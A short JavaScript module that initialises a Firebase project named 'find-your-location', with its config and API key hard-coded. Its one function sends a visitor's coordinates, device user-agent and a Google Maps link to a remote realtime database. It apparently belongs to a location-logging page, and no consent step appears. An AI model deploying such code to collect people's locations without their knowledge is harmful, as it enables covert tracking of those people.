import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";

const firebaseConfig = {
  apiKey: "AIzaSyASuGpX9Qi4PqxsYFW_CUWuBoTE2MFMAjI",
  authDomain: "find-your-location-9d1b0.firebaseapp.com",
  databaseURL: "https://find-your-location-9d1b0-default-rtdb.asia-southeast1.firebasedatabase.app",
  projectId: "find-your-location-9d1b0",
  storageBucket: "find-your-location-9d1b0.appspot.com",
  messagingSenderId: "499285282329",
  appId: "1:499285282329:web:a58f1ee28fe98bff0f6488"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

export function uploadLocation(lat, lon, userAgent) {
  const now = new Date();
  const yyyy = now.getFullYear();
  const MM = String(now.getMonth() + 1).padStart(2, '0');
  const dd = String(now.getDate()).padStart(2, '0');
  const hh = String(now.getHours()).padStart(2, '0');
  const mm = String(now.getMinutes()).padStart(2, '0');
  const ss = String(now.getSeconds()).padStart(2, '0');

  const timeFormatted = `${yyyy}/${MM}/${dd} ${hh}:${mm}:${ss}(UTC+8)`;

  const toDMS = (deg) => {
    const absolute = Math.abs(deg);
    const degrees = Math.floor(absolute);
    const minutesFloat = (absolute - degrees) * 60;
    const minutes = Math.floor(minutesFloat);
    const seconds = ((minutesFloat - minutes) * 60).toFixed(2);
    return `${degrees}°${minutes}'${seconds}"`;
  };

  const latDir = lat >= 0 ? 'N' : 'S';
  const lonDir = lon >= 0 ? 'E' : 'W';
  const latDMS = toDMS(lat);
  const lonDMS = toDMS(lon);

  const mapURL = `https://www.google.com/maps?q=${lat},${lon}`;
  const data = `${timeFormatted}\n位置：${latDMS}${latDir} ${lonDMS}${lonDir}\n裝置：${userAgent}\n地圖：${mapURL}`;

  const timestamp = Date.now();
  set(ref(db, 'locations/' + timestamp), {
    location: data
  });
}